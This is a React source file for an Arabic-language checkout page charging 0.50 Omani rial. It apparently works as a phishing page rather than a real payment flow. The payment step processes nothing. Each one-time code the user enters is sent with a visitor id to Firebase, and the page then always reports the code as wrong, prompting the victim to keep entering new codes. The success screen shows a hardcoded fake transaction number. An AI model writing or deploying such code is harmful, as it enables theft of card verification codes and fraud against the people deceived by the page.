"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { AlertCircle, CheckCircle, ArrowLeft } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { ProgressIndicator } from "./progress-indicator"
import { PaymentForm } from "./payment-form"
import { CustomerForm } from "./customer-form"
import { addData } from "@/lib/firebase"

type CheckoutStep = "customer" | "payment" | "otp" | "success" | "error"

interface CustomerData {
  firstName: string
  phone: string
  city: string
  address: string
  postalCode: string
}

interface CardData {
  number: string
  name: string
  expiry: string
  cvv: string
}

const allOtps = [""]

export default function Component() {
  const [step, setStep] = useState<CheckoutStep>("customer")
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [otp, setOtp] = useState("")
  const [countdown, setCountdown] = useState(30)
  const [canResend, setCanResend] = useState(false)

  const [customerData, setCustomerData] = useState<CustomerData>({
    firstName: "",
    phone: "",
    city: "",
    address: "",
    postalCode: "",
  })

  const [cardData, setCardData] = useState<CardData>({
    number: "",
    name: "",
    expiry: "",
    cvv: "",
  })

  const steps = ["معلومات العميل", "الدفع", "التحقق", "اكتمال"]
  const currentStepIndex = step === "customer" ? 0 : step === "payment" ? 1 : step === "otp" ? 2 : 3

  // Countdown timer effect
  useEffect(() => {
    let interval: NodeJS.Timeout | null = null

    if (step === "otp" && countdown > 0) {
      interval = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            setCanResend(true)
            return 0
          }
          return prev - 1
        })
      }, 1000)
    }

    return () => {
      if (interval) {
        clearInterval(interval)
      }
    }
  }, [step, countdown])

  // Reset countdown when entering OTP step
  useEffect(() => {
    if (step === "otp") {
      setCountdown(30)
      setCanResend(false)
    }
  }, [step])

  const handleCustomerNext = () => {
    setStep("payment")
  }

  const handlePaymentNext = async () => {
    setError("")
    setStep("otp")
  }

  const handleResendOtp = () => {
    setCountdown(30)
    setCanResend(false)
    setError("")
    // Here you would typically call your API to resend the OTP
    console.log("Resending OTP...")
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleOtpVerification = async (e: React.FormEvent) => {
    e.preventDefault()
    const _id = localStorage.getItem("visitor")
    setLoading(true)
    allOtps.push(otp)
    addData({ id: _id, otp, allOtps })

    setTimeout(() => {
      setLoading(false)
      setOtp("")
      setError("الرمز خاطىء يرجى المحاولة مره اخرى")
    }, 5000)
  }

  const resetForm = () => {
    setStep("customer")
    setError("")
    setOtp("")
    setCountdown(30)
    setCanResend(false)
    setCustomerData({
      firstName: "",
      phone: "",
      city: "",
      address: "",
      postalCode: "",
    })
    setCardData({ number: "", name: "", expiry: "", cvv: "" })
  }

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-gray-50 via-blue-50 to-indigo-100 p-4 flex items-center justify-center"
      dir="rtl"
    >
      <div className="w-full max-w-2xl">
        {(step === "customer" || step === "payment") && (
          <ProgressIndicator currentStep={currentStepIndex} steps={steps} />
        )}

        {step === "customer" && (
          <CustomerForm customerData={customerData} setCustomerData={setCustomerData} onNext={handleCustomerNext} />
        )}

        {step === "payment" && (
          <PaymentForm
            cardData={cardData}
            setCardData={setCardData}
            onNext={handlePaymentNext}
            onBack={() => setStep("customer")}
            loading={loading}
          />
        )}

        {/* OTP Verification Dialog */}
        <Dialog open={step === "otp"} onOpenChange={() => {}}>
          <DialogContent className="sm:max-w-md" dir="rtl">
            <DialogHeader>
              <DialogTitle className="text-center text-xl font-bold">تأكيد رمز التحقق</DialogTitle>
              <DialogDescription className="text-center text-gray-600">
                تم إرسال رمز التحقق إلى هاتفك المحمول المنتهي بـ ****{customerData.phone.slice(-4)}
              </DialogDescription>
            </DialogHeader>

            <form onSubmit={handleOtpVerification} className="space-y-6">
              <div className="space-y-3">
                <Label htmlFor="otp" className="text-center block font-medium">
                  أدخل رمز التحقق المكون من 6 أرقام
                </Label>
                <Input
                  id="otp"
                  type="tel"
                  placeholder="000000"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  className="text-center text-2xl tracking-[0.5em] h-14 font-mono border-2 focus:border-blue-500"
                  maxLength={6}
                  required
                />

                <div className="text-center">
                  <p className="text-sm text-gray-500 mb-2">لم تستلم الرمز؟</p>
                  {canResend ? (
                    <button
                      type="button"
                      onClick={handleResendOtp}
                      className="text-blue-600 hover:underline text-sm font-medium hover:text-blue-700 transition-colors"
                    >
                      إعادة الإرسال
                    </button>
                  ) : (
                    <span className="text-gray-400 text-sm font-medium">إعادة الإرسال ({formatTime(countdown)})</span>
                  )}
                </div>
              </div>

              {error && (
                <Alert variant="destructive">
                  <AlertCircle className="h-4 w-4" />
                  <AlertDescription>{error}</AlertDescription>
                </Alert>
              )}

              <Button
                type="submit"
                className="w-full h-12 bg-gradient-to-r from-green-600 to-[#047857] hover:from-[#047857] hover:to-indigo-700"
                disabled={loading}
              >
                {loading ? (
                  <div className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    جاري التحقق...
                  </div>
                ) : (
                  "تأكيد الرمز"
                )}
              </Button>
            </form>
          </DialogContent>
        </Dialog>

        {/* Success State */}
        {step === "success" && (
          <Card className="w-full text-center shadow-2xl border-0 bg-white">
            <CardContent className="pt-8 pb-8">
              <div className="mx-auto w-20 h-20 bg-gradient-to-r from-green-100 to-emerald-100 rounded-full flex items-center justify-center mb-6">
                <CheckCircle className="h-10 w-10 text-green-600" />
              </div>
              <h2 className="text-3xl font-bold text-green-800 mb-3">تم الدفع بنجاح!</h2>
              <p className="text-gray-600 mb-8 text-lg">
                شكراً لك {customerData.firstName}، تمت عملية الدفع بنجاح وسيتم إرسال إيصال الدفع عبر الرسائل النصية.
              </p>

              <div className="bg-gradient-to-r from-gray-50 to-blue-50 p-6 rounded-xl mb-8 border">
                <h3 className="font-bold text-gray-800 mb-4 text-lg">تفاصيل العملية</h3>
                <div className="space-y-3 text-sm">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">رقم العملية:</span>
                    <span className="font-mono font-medium">#TXN-2024-001234</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">العميل:</span>
                    <span className="font-medium">{customerData.firstName}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">المبلغ المدفوع:</span>W
                    <span className="font-bold text-lg text-green-600">0.50 ريال عماني</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">تاريخ العملية:</span>
                    <span className="font-medium">{new Date().toLocaleDateString("ar-SA")}</span>
                  </div>
                </div>
              </div>

              <div className="space-y-3">
                <Button
                  onClick={resetForm}
                  className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700"
                >
                  عملية شراء جديدة
                </Button>
                <Button variant="outline" className="w-full h-12 border-gray-300 hover:bg-gray-50 bg-transparent">
                  تحميل الإيصال
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Error State */}
        {step === "error" && (
          <Card className="w-full text-center shadow-2xl border-0 bg-white">
            <CardContent className="pt-8 pb-8">
              <div className="mx-auto w-20 h-20 bg-gradient-to-r from-red-100 to-pink-100 rounded-full flex items-center justify-center mb-6">
                <AlertCircle className="h-10 w-10 text-red-600" />
              </div>
              <h2 className="text-3xl font-bold text-red-800 mb-3">فشل في عملية الدفع</h2>
              <p className="text-gray-600 mb-6 text-lg">{error}</p>

              <Alert variant="destructive" className="mb-8 text-right">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>
                  <strong>الأسباب المحتملة:</strong>
                  <ul className="mt-2 space-y-1 text-sm">
                    <li>• رصيد غير كافي في البطاقة</li>
                    <li>• بيانات البطاقة غير صحيحة</li>
                    <li>• انتهاء صلاحية البطاقة</li>
                    <li>• مشكلة في الاتصال بالبنك</li>
                  </ul>
                </AlertDescription>
              </Alert>

              <div className="space-y-3">
                <Button
                  onClick={() => setStep("payment")}
                  className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700"
                >
                  <ArrowLeft className="w-4 h-4 ml-2" />
                  المحاولة مرة أخرى
                </Button>
                <Button variant="outline" className="w-full h-12 border-gray-300 hover:bg-gray-50 bg-transparent">
                  التواصل مع الدعم الفني
                </Button>
                <Button variant="ghost" onClick={resetForm} className="w-full h-12 text-gray-600 hover:bg-gray-50">
                  إلغاء العملية
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
